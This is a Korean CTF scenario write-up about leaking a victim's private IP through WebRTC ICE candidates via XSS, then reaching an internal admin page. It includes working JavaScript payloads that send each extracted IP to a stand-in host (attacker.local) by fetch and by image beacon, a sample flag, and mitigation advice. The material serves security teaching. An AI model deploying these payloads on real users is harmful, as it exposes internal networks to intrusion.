---
title: WebRTC IP Leakage & Internal Reconnaissance — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, client-side, webrtc, ip-leak, reconnaissance, network-scanning]
confidence: high
---

# WebRTC IP Leakage & Internal Reconnaissance — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Intranet Portal Scanner (내부망 포털 스캐너)
- **난이도**: Medium
- **핵심 컨셉**: 웹 브라우저의 최신 P2P 통신 표준 규격인 **WebRTC**를 이용해 클라이언트의 가상 사설망 및 실제 내부망 IP를 식별해내는 정보 유출 취약점 문제입니다. 공격자는 일반적인 XSS나 단순 스크립트 실행 권한을 얻은 상태이지만, 방화벽 뒤에 숨어있는 관리자 PC의 내부 로컬 IP 대역(예: `10.x.x.x` 또는 `192.168.x.x`)을 몰라 사설망 내 타깃 장비 공격에 어려움을 겪고 있습니다. 공격자는 자바스크립트를 활용해 WebRTC 커넥션을 강제로 생성하고, 브라우저가 생성하는 SDP(세션 기술 프로토콜) 데이터에서 관리자의 로컬 사설 IP를 적출해 외부 리시버로 송출합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Client chat UI**: 사용자들이 실시간 화상/음성 대화를 진행할 수 있도록 설계된 WebRTC 기반 통신 포털.
- **Backend Service (Python/Flask or Node.js)**:
  - 사용자 채널 정보 매핑 및 세션 연결 브로커(Signaling Server) 기능 제공.
- **Flag 위치**:
  - 관리자 봇이 사용하는 브라우저 상의 내부 IP 주소를 알아내고, 해당 IP로 동작하는 내부 관리 페이지의 특정 비밀 데이터(플래그)를 가져와야 함. (스캔 연계 목적)
  - 가상 내부 IP 포털 주소: `http://[관리자_내부_IP]:8080/admin/secrets`

### 2.2 취약점 지점
1. **Unrestricted WebRTC Local ICE Candidate Generation**:
   - 브라우저의 WebRTC API인 `RTCPeerConnection`은 로컬 NAT 방화벽 뒤의 P2P 통신을 돕기 위해, STUN 서버 질의를 거치지 않고도 로컬 컴퓨터에 할당된 모든 실제 네트워크 인터페이스의 사설 IP 주소 후보군(ICE Candidate)을 자바스크립트에 넘겨 줍니다.
   - 이는 브라우저 샌드박스의 일반적인 동일출처정책(SOP) 제한을 받지 않고 사설 IP 정보를 노출시키는 특성을 가집니다.

---

## 3. 공격 면 (Attack Surface)

| 컴포넌트 | 인터페이스 | 인증 | 입력 값 | 반환 값 | 비고 |
|----------|------------|------|---------|---------|------|
| 브라우저 런타임 | `window.RTCPeerConnection` | 없음 | Javascript API 호출 | Local IP 문자열이 포함된 SDP / Candidate | 클라이언트 브라우저 측 정보 누출 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. WebRTC 기반 로컬 IP 추출 스크립트 구성
공격자는 피해자의 브라우저 내에서 강제로 `RTCPeerConnection`을 생성해 로컬 IP 후보를 모집(Gathering)하는 자바스크립트 코드를 준비합니다.
- **IP Leakage Javascript Code**:
  ```javascript
  function getLocalIPs(callback) {
      var ips = [];
      // 가상의 RTCPeerConnection 생성 (공인 STUN이 아니어도 됨)
      var pc = new RTCPeerConnection({
          iceServers: [] // 외부 stun을 주지 않아도 로컬 인터페이스가 누출됨
      });
      
      // 더미 데이터 채널 생성
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer));
      
      pc.onicecandidate = function(ice) {
          if (!ice || !ice.candidate || !ice.candidate.candidate) return;
          
          // ICE candidate 내에서 IP 정규식 파싱
          // 예: candidate:842163049 1 udp 1677721855 192.168.1.155 58376 typ host ...
          var parts = ice.candidate.candidate.split(" ");
          var ip = parts[4]; 
          
          if (ips.indexOf(ip) === -1) {
              ips.push(ip);
              callback(ip);
          }
      };
  }

  // 추출된 IP를 외부 리시버로 유출
  getLocalIPs(function(ip) {
      fetch("http://attacker.local/log_ip?ip=" + encodeURIComponent(ip));
  });
  ```

### Step 2. XSS 공격 또는 어드민 방문 유도
1. 공격자는 해당 자바스크립트 페이로드를 취약한 게시판(XSS 성립)에 심거나, 관리자 봇이 접근하는 커스텀 웹 문서 내에 인젝션합니다.
2. 관리자 봇이 해당 페이지를 열어 스크립트가 실행됩니다.

### Step 3. 사설 IP 유출 및 스캔
1. 관리자 브라우저가 내부 렌더링 중 위 스크립트를 가동하여 자신의 실제 사설 IP 주소(예: `192.168.23.142`)를 추출합니다.
2. 공격자 서버 리시버 로그에 `ip=192.168.23.142`가 성공적으로 수집됩니다.

### Step 4. flag 획득
공격자는 탈취한 어드민의 사설 IP 주소를 기반으로, CSRF 또는 어드민 브라우저 권한을 빌려 내부 포털로 요청을 다시 보내도록 추가 스크립트를 밀어 넣고 (`http://192.168.23.142:8080/admin/secrets`), 결과값 플래그(`FLAG{webrtc_ip_leakage_leads_to_intranet_scan}`)를 유출받아 획득합니다.

---

## 5. 취약점 유발 프론트엔드 코드 스니펫

```html
<!-- index.html (실시간 통신 챗 화면 예시) -->
<!DOCTYPE html>
<html>
<head><title>WebRTC Chat App</title></head>
<body>
    <h1>Real-time signaling channel</h1>
    <div id="chat-messages">
        <!-- 취약점 지점: XSS가 작동하여 아래 악성 스크립트 엘리먼트가 그대로 렌더링됨 -->
        <script>
            // 브라우저가 지원하는 RTCPeerConnection API를 강제 트리거
            var pc = new (window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection)({
                iceServers: []
            });
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = function(e) {
                if (e && e.candidate) {
                    // ICE Candidate 파싱하여 IP 추출
                    var candidate = e.candidate.candidate;
                    var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    var ipAddr = ipRegex.exec(candidate)[1];
                    
                    // 추출 결과 공격자 사이트로 전송
                    var img = new Image();
                    img.src = "http://attacker.local/log?ip=" + ipAddr;
                }
            };
        </script>
    </div>
</body>
</html>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **브라우저단 WebRTC ICE Candidate 정책 강화 (mDNS 사용)**:
   - 최신 웹 브라우저(Chrome, Firefox 등)는 사설 IP 유출을 차단하기 위해 로컬 실제 IP 대신 무작위 mDNS 호스트명(예: `d68f7b52-9bc5-4424-9b5a.local`)을 제공하도록 업데이트되었습니다. 브라우저 설정을 항상 최신 보안 권장사항으로 업데이트합니다.
2. **XSS 방지 정책 강제화**:
   - 웹 애플리케이션에서 위험 스크립트가 실행되지 않도록 유저 입력값에 대한 철저한 정화(Sanitize)를 적용하고, HTML Entity 이스케이프를 적용합니다.
3. **콘텐츠 보안 정책 (CSP) 헤더 제한**:
   - `connect-src 'self'`를 지정하여 웹 브라우저가 임의의 알 수 없는 공격자 서버 주소(`http://attacker.local`)로 데이터를 송출(fetch, XHR 등)하는 연결 행동 자체를 봉쇄합니다.
